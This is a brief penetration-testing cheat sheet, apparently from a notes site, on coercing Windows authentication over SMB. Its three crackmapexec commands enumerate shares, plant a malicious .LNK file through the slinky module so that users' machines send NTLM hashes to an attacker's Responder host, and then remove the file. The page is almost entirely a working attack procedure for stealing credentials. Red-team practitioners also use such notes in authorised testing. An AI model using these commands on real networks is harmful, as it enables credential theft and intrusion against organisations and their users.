# Coercing Authentication

### Harvest NTLMv2/v1 credentials if you have write-access to a share.

1\. Enumerate the hosts shares

```bash
crackmapexec smb $ip -u $username -p $password --shares
```

2\. Create a malicious .LNK file calling back to your Responder.py IP

```bash
crackmapexec smb $ip -u $username -p $password -M slinky -o NAME=$share SERVER=[ResponderIP]
```

3\. After waiting and (hopefully) obtaining several NTLM hashes, cleanup the malicious file

```bash
crackmapexec smb $ip -u $username -p $password -M slinky -o NAME=$share SERVER=$responder_ip CLEANUP=True
```

### References

{% embed url="https://twitter.com/mpgn_x64/status/1453018750253424643?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1453018750253424643%7Ctwgr%5E8b8f7eedaf8bb13b607a524f5b0ba977c31a46c0%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fcdn.iframe.ly%2FEsKWvl5%3Fapp%3D1" %}
